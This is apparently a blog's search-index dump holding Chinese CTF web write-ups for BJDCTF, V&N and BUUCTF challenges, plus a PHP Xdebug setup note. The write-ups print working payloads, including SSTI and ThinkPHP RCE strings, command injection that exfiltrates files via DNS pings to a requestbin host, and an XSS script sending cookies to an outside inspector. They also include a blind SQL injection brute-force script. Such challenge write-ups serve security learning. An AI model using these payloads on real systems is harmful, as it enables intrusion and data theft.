<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[BJDCTF 2nd Web Writeup]]></title>
      <url>/writeups/2020/03/23/BJDCTF-2nd-Web/</url>
      <content type="text"><![CDATA[上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。fake google题目描述题目用了谷歌搜索的前端页面，随便输入点东西，返回：P3's girlfirend is : foo原样返回了，再看看源码：&lt;!--ssssssti &amp; a little trick --&gt;解题思路都这么明显了，直接SSTI，先检测一下什么模板：{{7*'7'}} =&gt; 7777777是Jinja2。然后试了一下，发现”{%%}”标签和好多函数都不能用，最后importi了os，读取了flag，Payload：{{''.__class__.__mro__[1].__subclasses__()[64].__init__.__globals__['__import__']('os').popen('base64 &lt; /flag').read()}}备注      说实话并不知道为什么那些函数不能用了，回头看看出题笔记。        好像也做过好几个SSTI了，当然只是是非常基础的类型，但每次都是找博客，直接抄抄改改人家的Payload。接下来好好整理总结一下SSTI。        Payload找可用函数的时候因为”{%%}”标签不能用，是手动二分出来的，其实可以用Python搞。        还不是很理解Python的类什么的，回炉重造一波。        贴一个官方的Payload：     ?name={{ config.class.init.globals['os'].popen('ls /').read() }}      old-hack题目描述是个黑页，目录扫了一遍没什么信息，不过注意到用了ThinkPHP5。解题思路ThinkPHP5漏洞多多，查看Debug界面，版本为5.0.23，又一个RCE漏洞，百度了Payload：?s=captchaPOST：_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag备注  并没有了解过ThinkPHP的一系列漏洞，打算抽空学习一下。  然后也没有学习过ThinkPHP的基本用法，Payload也用得云里雾里，下次必学。dungShell题目描述提示写到脸上了，有.swp文件。解题思路源码删减：12345678910111213141516&lt;?phperror_reporting(0);echo "how can i give you source code? .swp?!"."&lt;br&gt;";if (!isset($_POST['girl_friend'])) {    die("where is P3rh4ps's girl friend ???");} else {    $girl = $_POST['girl_friend'];    if (preg_match('/\&gt;|\\\/', $girl)) {        die('just girl');    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {        echo "&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;";    } else {        //duangShell~~~~        exec($girl);    }}拦截形同虚设，可以用”php -r”执行PHP代码。不过没有回显，需要将结果打到DNS上。扫根目录：POST：girl_friend=php -r "system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"读/flag：POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"分两次读，解码后：flag{flag-is-not-here,please-find-it-by-yourself}不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');"备注      后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx|bash弹Shell，然后find一下flag。        因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：      POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"        YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&gt; a=$(find / -name flag);echo ${a:10:15}|base64  不得不说，上面这个方法太蛋疼了，得整一个VPS工具。简单注入题目描述上来就是个登录框，注入写到了脸上。解题思路先看看请求头等其它地方又没有什么信息，无果，那就老老实实注入吧。Fuzz一下，单双引号、select、union都被拦截了。一步一步来。首先这肯定是个字符型注入，引号又被过滤，只能想着对原有的引号下手，宽字节试了一下没什么用，不过”\“起作用了，Payload：POST：password=or 2&gt;1#&amp;username=\返回里有句话变了：BJD needs to be stronger失败了？但是修改Payload中的布尔值之后的返回和其它错误密码的结果一样：You konw ,P3rh4ps needs a girl friend这说明刚刚的注入确实成功了，应该是在PHP中将我们的输入和Mysql返回的密码又做了一次对比，那就盲注一下密码，Payload：POST：password=or password regexp ^0x#&amp;username=\Python跑了结果是：ohyoufoundit然后登录，失败了，还是没有通过在PHP中的验证，但在Mysql中确确实实是通过了，很疑惑。看了官方WP，原来是大小写的问题，所以虽然Mysql通过了，但在PHP中被大小写拦住了，出题人的脚本：import requests# P3rh4ps tql!!!url='http://39.106.207.66:2333/'def str2hex(string):    c='0x'    a=''    for i in string:        a+=hex(ord(i))    return c+a.replace('0x','')alphabet = ['!','[',']','{','}','_','/','-','&amp;',"%",'#','@','a','b','c','d','e','f','g','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']flag='^'for i in range(0,20):    for y in alphabet:        tmp=flag+y        data = {            "username": "P3rh4ps\\",            "password": "||password regexp binary {}#".format(str2hex(tmp))        }   #     print(data['password'])        x=requests.session()        if 'BJD needs' in x.post(url,data=data).text:        #    print(x.post(url,data=data).text)            flag=tmp            break    print(flag.replace("^",""))爆出密码后登录获得flag。备注  Fuzz很重要，要先fuzz。  Mysql的字段内容在查询的时候是忽略大小写的，但其实在实际的编码存储中还是有区别的。  REGEXP匹配是大小写不敏感的，为区分大小写可以加上BINARY关键字。假猪套天下第一题目描述上来是个登录框，随便试试，居然成功了，返回的界面很炫酷，但是没什么信息。解题思路在返回的页面的源码中找到一个叫”L0g1n.php”的文件，访问一波。返回如下内容：Sorry, this site will be available after totally 99 years!然后可以看到Cookie中有个时间戳，接着就卡住了，因为受Schrodin那题的影响，一直以为是要把时间改早，然后一直没过，其实是要往后改，有新返回：Sorry, this site is only optimized for those who comes from localhost改IP，这里X-Forward-For不能用要用Clint-IP或者X-Real-IP，提交。然后就是好几次类似地改请求头，最后在返回的源码里面找到flag。其中有一步需要改User-Agent，给的提示是Commodo 64，但实际上型号是Commodore 64，百度直接搜索不到这个结果，不过Google可以。所有Headers如下：备注  还是思维僵化的问题。  对于Headers的了解也不太够。xss之光题目描述页面只有九个字符，”gungungun”，抓包看了下也没有任何信息。解题思路那就扫目录呗，有git泄漏，提取一下：&lt;?php$a = unserialize($_GET['yds_is_so_beautiful']);echo $a;  有点谜，只有一个反序列化，但是没有魔术方法。应该不是反序列化漏洞，注意到反序列化之后会echo出来，可能会和XSS有关。试着alert一下，成功了，但是没有给Cookie。然后看了提示，要把Cookie打出去，可能要读Cookie？试一试：serialize("&lt;script&gt;document.body.appendChild(document.createElement('img')).setAttribute('src','https://requestinspector.com/inspect/01e40wkvsk52d6dzx2axgggmqm?c='+document.cookie);&lt;/script&gt;")然后在Cookie里面找到了发回来的flag，有点迷。备注  还是思维僵化了，看到unserialize()就总想着反序列化漏洞。  然后对于XSS还是不熟悉。Schrodin题目描述一眼看到一大段文字：You can give a wibsite to this page and this page will automatically identify various parameters of the target and try to burst the password.The longer the compute time is, the higher the success rate of the burst is.But before the final result is checked, no one knows whether to burst out the password. We call it the superposition state of burst and unburstYou can check the progress at any time, but once you check the progress, this website will stop bursting and delete the relevant progress, which we call the collapse of the superposition state.If the CPU of the server is idle, it must be able to burst out the password you want very soon :)Enjoy it!再下面是一个文本框和”Input”、”Check”两个按钮，然后显示了CPU利用率。解题思路读一读，大致意思是它接受一个URL，然后可以爆破指定页面的密码。而在查看结果之前无法确定是否爆破成功，查看之后无论成功与否都会销毁相关信息。成功率受CPU利用率和爆破时间影响。然后没有思路，看看源码。源码中发现一个叫做test.php的文件，访问一下是个登录界面，傻乎乎地注了一波没什么结果。突然想起来是不是要用题目给的页面来对密码进行爆破，试一试，然而成功率很低：Load of Server CPU98.65888129551892%Already burst 5 sec, 148102 p/sForecast success rate 7.564358188440272%失败了：Burst failed, maybe you should try longer.下面就是应该想办法提高成功率了，注意到好像上面三个数据的变化都是不需要联网的，看看JS：function _A(){	var num = 13;	var rate = 0.5;	var c = 1;	var t = setInterval(function(){		var symbol = Math.random() &gt; rate ? 1 : -1;		var add_number = Math.random() * symbol * c;		if(num + add_number &gt; 100 || num + add_number &lt; 10){		}		else{			num += add_number;			var span1 = document.getElementById('span1');			span1.innerText = num + '%';		}	}, 100);}function _(){	var num = 13;	var rate = 0.2;	var c = 10;	var t = setInterval(function(){		var symbol = Math.random() &gt; rate ? 1 : -1;		var add_number = Math.random() * symbol * c;		if(num + add_number &gt; 100 || num + add_number &lt; 10){		}		else{			num += add_number;			var span1 = document.getElementById('span1');			span1.innerText = num + '%';		}	}, 100);}function __(sub){	var s = sub;	var t = setInterval(function(){		s += 1;		var span2 = document.getElementById('span2');		span2.innerText = s;	}, 1000);}function ___(){	var t = setInterval(function(){		var pwd = Math.floor(Math.random()* (150000 - 120000) + 120000);		span3.innerText = pwd;	}, 1000);}function script(sub){	var rate = sub;	var t = setInterval(function(){		rate += 1;		span4.innerText = Math.log(rate) * 4.7;	}, 1000);}很明显CPU利用率完全是随机数，但是爆破时间函数接受了一个参数，抓包看看，HTML中的脚本是这样的：&lt;script&gt;_();__(1);___();script(1);&lt;/script&gt;两个函数的参数是一样的，来自服务器，然后线索又断了。继续抓包，看看Check的时候B/S是怎么通信的，注意到发送了两个Cookie，PHPSESSID和dXNlcg，后者一看就有问题，它的内容是”MTU4NTAxMzM2MQ%3D%3D”，base64解码一下，是”user”和”1585013361”。时间戳？确实，这么说来Check的时候是用时间戳来判断爆破时间的。那就改小一点试一下，成功了：Burst successed! The passwd is av11664517@1583985203.一个B站视频号和一个时间戳，然后在视频的评论区找到flag。备注  脑洞题，唯一的问题就是看到时间戳反应慢了。elementmaster题目描述一幅漫画：解题思路在源码中看到两个隐藏标签，id后面跟着一串可疑的字符”506F2E”和”706870”，Hex解一下，是”Po.”和”php”，拼起来是个PHP文件，访问一下，返回只有一个字符”.”。漫画中提到了门捷列夫和118种元素，而Po也是一种元素，可以试着用Python跑一下每种元素的页面，所有返回拼成了一个新的文件”And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php”，访问获得flag。备注  也是脑洞题，唯一的问题在于忽略了id后面的Hex字符。文件探测题目描述界面挺炫酷的，不过没什么用，然后在源码里发现一点信息：&lt;!-- Inheriting and carrying forward the traditional culture of the first BJDCTF, I left a hint in some place that you may neglect  --&gt;解题思路Emmm，完全不记得上次BJD有什么传统，不过在响应头中找到一个了提示的文件名”home.php”，原来这是传统啊。访问一下，要求回答三个问题：你知道目录下都有什么文件吗?请输入你想检测文件内容长度的url你希望以何种方式访问？GET？POST?然后作为三个POST参数一起发出去，分别设为foo、bar、quz，返回如下：~$ python fuck.py -u "bar.y1ng.txt" -M quz -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei       Error:  url invalid没什么线索，不过注意到访问home.php时，URL被重定向为”home.php?file=system”，然后页面还提示了”现在访问的是 system.php”。文件包含吗？伪协议读一下源码：home.php?file=php://filter/convert.base64-encode/resource=homehome.php源码删减：&lt;?phpsetcookie("y1ng", sha1(md5('y1ng')), time() + 3600);setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);if(isset($_GET['file'])){    if (preg_match("/\^|\~|&amp;|\|/", $_GET['file'])) {        die("forbidden");    }    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){        die("not now!");    }    if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file'])){        die("You! are! not! my! admin!");    }    if(preg_match("/^home$/i", $_GET['file'])){        die("禁止套娃");    }    else{        if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file'])){            $file = $_GET['file'].".php";        }        else{            $file = $_GET['file'].".fxxkyou!";        }        echo "现在访问的是 ".$file . "&lt;br&gt;";        require $file;    }} else {    echo "&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;";}system.php源码删减：&lt;?phperror_reporting(0);if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){    echo "&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;";    header("Refresh:0.1;url=index.php");    die;}$str2 = '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ ';$str3 = '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ ';$str4 = '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ ';?&gt;&lt;?php$filter1 = '/^http:\/\/127\.0\.0\.1\//i';$filter2 = '/.?f.?l.?a.?g.?/i';if (isset($_POST['q1']) &amp;&amp; isset($_POST['q2']) &amp;&amp; isset($_POST['q3']) ) {    $url = $_POST['q2'].".y1ng.txt";    $method = $_POST['q3'];    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;";    echo $str1;    if (!preg_match($filter1, $url) ){        die($str2);    }    if (preg_match($filter2, $url)) {        die($str3);    }    if (!preg_match('/^GET/i', $method) &amp;&amp; !preg_match('/^POST/i', $method)) {        die($str4);    }    $detect = @file_get_contents($url, false);    print(sprintf("$url method&amp;content_size:$method%d", $detect));}?&gt;可以发现最后的sprintf()里将字符串匹配了”%d”，所以输出一直是0。不过因为字符串构造的问题，可以发生注入，将$method的值设为”GET%s%”即可。上面漏了一步，就是得知有admin.php这个文件，可以直接Scanner一把梭，或者推断一下，比如问”你知道目录下都有什么文件吗?”，而这个问题的答案并没有用到。admin.php的源码：&lt;?phperror_reporting(0);session_start();$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fakefunction aesEn($data, $key){    $method = 'AES-128-CBC';    $iv = md5($_SERVER['REMOTE_ADDR'],true);    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));}function Check(){    if (isset($_COOKIE['your_ip_address']) &amp;&amp; $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) &amp;&amp; $_COOKIE['y1ng'] === sha1(md5('y1ng')))        return true;    else        return false;}if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {    highlight_file(__FILE__);} else {    echo "&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is " . $_SERVER['REMOTE_ADDR'];}$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);if (isset($_GET['decrypt'])) {    $decr = $_GET['decrypt'];    if (Check()){        $data = $_SESSION['secret'];        include 'flag_2sln2ndln2klnlksnf.php';        $cipher = aesEn($data, 'y1ng');        if ($decr === $cipher){            echo WHAT_YOU_WANT;        } else {            die('爬');        }    } else{        header("Refresh:0.1;url=index.php");    }} else {    //I heard you can break PHP mt_rand seed    mt_srand(rand(0,9999999));    $length = mt_rand(40,80);    $_SESSION['secret'] = bin2hex(random_bytes($length));}?&gt;乍一看、$_SERVER[‘REMOTE_ADDR’]的值要是”127.0.0.1”，不过其实不影响，程序会继续执行。然后Check()的判断只要不乱改Cookie都可以过，然后就是破解AES加密了。可以看到aesEN()中只有$data是我们不知道的，它来自存放在SESSION中的一个随机数。看一下它的构成，因为只要设置了decrypt参数，$_SESSION[‘secret’]就不会更新，所以mt_rand()是可以爆破的，然而没什么用，random_bytes()过不了。这道题的思路是删掉Cookie中的PHPSESSID，这样$data就会被置空，Exp：&lt;?phpecho base64_encode(openssl_encrypt("", "AES-128-CBC", "y1ng", OPENSSL_RAW_DATA, md5("174.0.222.75", true)));?&gt;备注  插一句Base64的构成是字母26*2、数字10、以及”+”和”/”两个符号，当然还有占位符”=”。  这道题一开始就没想到要用文件包含读文件，确实有问题。  然后删掉PHPSESSID也挺出乎意料的，还是经验不够，容易钻牛角尖。EasyAspDotNet备注被秒了，我被秒了。这道题触及到了我的知识盲区，Windows上的ASP。Emmm，mark一下..]]></content>
      <categories>
        
          <category> Writeups </category>
        
      </categories>
      <tags>
        
          <tag> CTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[BJDCTF 2nd Web Writeup]]></title>
      <url>/writeups/2020/03/23/BJDCTF-2nd-Web-(copy)/</url>
      <content type="text"><![CDATA[上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。dungShell题目描述提示写到脸上了，有.swp文件。解题思路源码删减：12345678910111213141516&lt;?phperror_reporting(0);echo "how can i give you source code? .swp?!"."&lt;br&gt;";if (!isset($_POST['girl_friend'])) {    die("where is P3rh4ps's girl friend ???");} else {    $girl = $_POST['girl_friend'];    if (preg_match('/\&gt;|\\\/', $girl)) {        die('just girl');    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {        echo "&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;";    } else {        //duangShell~~~~        exec($girl);    }}拦截形同虚设，可以用”php -r”执行PHP代码。不过没有回显，需要将结果打到DNS上。扫根目录：POST：girl_friend=php -r "system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"读/flag：POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"分两次读，解码后：flag{flag-is-not-here,please-find-it-by-yourself}不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');"备注      后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx|bash弹Shell，然后find一下flag。        因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：     POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"     YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&gt; a=$(find / -name flag);echo ${a:10:15}|base64            不得不说，上面这个方法太蛋疼了，得整一个VPS工具。  ]]></content>
      <categories>
        
          <category> Writeups </category>
        
      </categories>
      <tags>
        
          <tag> CTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[使用VSCode+Xdebug]]></title>
      <url>/notes/2020/03/14/PHP-VSCode-Xdebug/</url>
      <content type="text"><![CDATA[关于IDE的事情拖了很久，Debug一直也用的是print大法。正好上次比赛遇到了一个审计PHP代码的题目，代码量实在是太大了，所以看看现代IDE会不会有所帮助。令人遗憾的是仅仅配置相关环境就花掉了很多时间。PHP安装Xdebug插件主要是要适配PHP的版本，其实只要把PHP的信息提交到Xdebug官网，后台就会自动返回详细的安装步骤。我这里还是记录一下吧。安装步骤      在Terminal输入以下命令，并将输出完全粘贴到Xdebug官网的向导中：     php -i        官网返回了我的PHP主要信息：     Xdebug installed: 2.9.3 Server API: Command Line Interface Windows: no Zend Server: no PHP Version: 7.2.24-0 Zend API nr: 320170718 PHP API nr: 20170718 Debug Build: no Thread Safe Build: no OPcache Loaded: no Configuration File Path: /etc/php/7.2/cli Configuration File: /etc/php/7.2/cli/php.ini Extensions directory: /usr/lib/php/20170718            根据提示下载并解压相应的源码包        安装编译PHP扩展所需要的软件，用如下命令：     apt-get install php-dev autoconf automake            运行phpize：     phpize            配置并编译Xdebug源码        将目录modules/下生成的文件xdebug.so复制到扩展目录（见PHP信息）        向PHP配置文件中加入如下信息（见PHP信息）：     zend_extension = {PHP扩展目录}/xdebug.so            根据需要更新其它的PHP配置文件  备注  php -i返回的内容与phpinfo()相同，包含了PHP版本、配置文件位置等重要信息  php.ini是PHP的配置文件，PHP可能有多个配置文件，以针对不同的服务，如Apache2服务、Command Line等  php-dev是一个依赖库，是开发、编译PHP扩展的必要组件。  autoconf、automake是用于自动配置和编译源码的工具  phpize是一个PHP扩展安装工具，可以根据源码生成配置文件  Zend引擎是PHP的内核安装VSCode插件PHP Debug这个扩展是一个在VSCode和Xdebug之间的适配器。PHP IntelliSensePHP智能感知，提供了语法提示、定义跳转等功能。利用VSCode调试      在VSCode中打开目标文件和其所在的目录        第一次使用需要配置launch.json文件，插入如下内容：     "configurations": [     {         "name": "Listen for XDebug",         "type": "php",         "request": "launch",         "port": 9000     },     {         "name": "Launch currently open script",         "type": "php",         "request": "launch",         "program": "${file}",         "cwd": "${fileDirname}",         "port": 9000     } ]            以上内容配置了两个功能，”Listen for XDebug”和”Launch currently open script”。前者启动后将监视PHP的CLI或其它服务，PHP服务运行后程序将在断点处停止。后者则直接在VSCode中运行PHP程序。  ]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> PHP </tag>
        
          <tag> IDE </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[V&N Web Writeup]]></title>
      <url>/writeups/2020/02/29/V&NCTF-Web/</url>
      <content type="text"><![CDATA[HappyCTFd题目描述访问到的是一个类似于BUUCTF的题库。注册后登录，有一个用户列表，可以看到一个admin用户，然后可以查看每个人的解题记录，不过都是”No solves yet”。然后可以修改密码和一些其它信息。注意到有一个叫做”Access Tokens”的功能，可以申请API Key，不是很了解。CHECKIN题目描述直接给出了源码：from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open("flag.txt", "r")# flag = flag_file.read()# flag_file.close()## @app.route('/flag')# def flag():#     return flag## want flag? naive!# You will never find the thing you want:) I think@app.route('/shell')def shell():    os.system("rm -f flag.txt")    exec_cmd = request.args.get('c')    os.system(exec_cmd)    return "1"@app.route('/')def source():    return open("app.py","r").read()if __name__ == "__main__":    app.run(host='0.0.0.0')解题思路看着就是要利用shell读文件，但是访问shell的时候会将flag文件删除。注意到虽然文件利用rm命令删除了，但是程序本身打开的文件流还没有关闭。思路是这样的，先获取当前程序的进程号，和文件的文件描述符，然后访问/proc/&lt;进程号&gt;/fd/&lt;文件描述符&gt;就可以获得原文件的内容。内容可以ping到DNS上。一番操作发现几个有用的命令都被禁掉了：lsof、ps、grep顶不住了。TimeTravel题目描述直接给了源码：&lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) {    $client = new Client();    $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible');    $content = $response-&gt;getBody();    $data = json_decode($content, TRUE);    if($data['success'] === true) {      echo system('/readflag');    }}if(isset($_GET['file'])) {    highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) {    phpinfo();}读autoload.php：&lt;?php// autoload.php @generated by Composerrequire_once __DIR__ . '/composer/autoload_real.php';return ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();再读：&lt;?php// autoload_real.php @generated by Composerclass ComposerAutoloaderInit52ffee59545490028d211df73b41c57d{    private static $loader;    public static function loadClassLoader($class)    {        if ('Composer\Autoload\ClassLoader' === $class) {            require __DIR__ . '/ClassLoader.php';        }    }    public static function getLoader()    {        if (null !== self::$loader) {            return self::$loader;        }        spl_autoload_register(array('ComposerAutoloaderInit52ffee59545490028d211df73b41c57d', 'loadClassLoader'), true, true);        self::$loader = $loader = new \Composer\Autoload\ClassLoader();        spl_autoload_unregister(array('ComposerAutoloaderInit52ffee59545490028d211df73b41c57d', 'loadClassLoader'));        $useStaticLoader = PHP_VERSION_ID &gt;= 50600 &amp;&amp; !defined('HHVM_VERSION') &amp;&amp; (!function_exists('zend_loader_file_encoded') || !zend_loader_file_encoded());        if ($useStaticLoader) {            require_once __DIR__ . '/autoload_static.php';            call_user_func(\Composer\Autoload\ComposerStaticInit52ffee59545490028d211df73b41c57d::getInitializer($loader));        } else {            $map = require __DIR__ . '/autoload_namespaces.php';            foreach ($map as $namespace =&gt; $path) {                $loader-&gt;set($namespace, $path);            }            $map = require __DIR__ . '/autoload_psr4.php';            foreach ($map as $namespace =&gt; $path) {                $loader-&gt;setPsr4($namespace, $path);            }            $classMap = require __DIR__ . '/autoload_classmap.php';            if ($classMap) {                $loader-&gt;addClassMap($classMap);            }        }        $loader-&gt;register(true);        if ($useStaticLoader) {            $includeFiles = Composer\Autoload\ComposerStaticInit52ffee59545490028d211df73b41c57d::$files;        } else {            $includeFiles = require __DIR__ . '/autoload_files.php';        }        foreach ($includeFiles as $fileIdentifier =&gt; $file) {            composerRequire52ffee59545490028d211df73b41c57d($fileIdentifier, $file);        }        return $loader;    }}function composerRequire52ffee59545490028d211df73b41c57d($fileIdentifier, $file){    if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) {        require $file;        $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;    }}]]></content>
      <categories>
        
          <category> Writeups </category>
        
      </categories>
      <tags>
        
          <tag> CTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[BUUCTF Web Training 0x01]]></title>
      <url>/notes/2020/02/28/BUUCTF-Web-0x01/</url>
      <content type="text"><![CDATA[[HCTF 2018]WarmUp题目描述根据注释中提示获得源码：&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt;解题思路简单讲就是file参数中如果包含?，就可以截断，然后URL编码一下绕过服务器的语法。然后根据hint.php的文件位置提示，读flag。备注  Terminal的cd命令会严格检查路径中每一个目录是否存在，不过PHP函数中的URL不会检查。[护网杯 2018]easy_tornado题目描述有三条提示：flag in /fllllllllllllagrendermd5(cookie_secret+md5(filename))URL中存在filename和filehash两个参数，可以读文件。解题思路简单来讲就是读文件，不过需要知道cookie_secret。结合提示render和题目中的tornado猜测可能存在模板注入，然后读一下cookie_secretPayload：/error?msg=然后构造hash，读文件。备注  render()是Python的一个渲染函数，也就是一种模板。  Tornado是一个Python框架，用于Web服务。  /error路由是Tornado的错误处理。[HCTF 2018]admin题目描述打开网站是一个简单的欢迎界面，提供了登录和注册的功能，然后源码中有提示：&lt;!-- you are not admin --&gt;可能是需要管理员账号登录。随便注册一个账号登录，多了两个功能，发帖和修改密码。不过虽然显示发帖成功，但/post路由却显示404，应该是没有这个功能了。解题思路根据提供的功能基本确定是二次注入了，然后注意到在修改密码页面的源码中有一个Github的链接，是网站框架的源码，一个Flask项目，然后代码审计。这题有三种解法：Unicode欺骗条件竞争Flask session伪造[RoarCTF 2019]Easy Calc题目描述就是一个计算器的功能，输入公式，返回一个结果。解题思路看一下页面源码，说设置了WAF，还有这样一段JS代码：$('#calc').submit(function(){    $.ajax({        url:"calc.php?num="+encodeURIComponent($("#content").val()),        type:'GET',        success:function(data){            $("#result").html(`&lt;div class="alert alert-success"&gt;        &lt;strong&gt;答案:&lt;/strong&gt;${data}        &lt;/div&gt;`);        },        error:function(){            alert("这啥?算不来!");        }    })    return false;})直接访问calc.php，给出了源码：&lt;?phperror_reporting(0);if(!isset($_GET['num'])){    show_source(__FILE__);}else{        $str = $_GET['num'];        $blacklist = [' ', '\t', '\r', '\n', '\'', '"', '`', '\[', '\]','\$','\','\^'];        foreach ($blacklist as $blackitem) {                if (preg_match('/' . $blackitem . '/m', $str)) {                        die("what are you want to do?");                }        }        eval('echo '.$str.';');}?&gt;黑名单很粗糙，绕一下，却返回了404。奇怪，再回头看看，应该是除了黑名单外，还在网站上设置了WAF。利用PHP查询字符串解析特性，参数前加个空格绕过，获得flag。备注  PHP会将查询字符串转换为$_GET等关联数组，这个过程中调用了parse_str()。  parse_str()会删除两端的空白符，并将一些字符换为下划线，如：”%20foo%20bar%00”=&gt;”foo_bar”。[强网杯 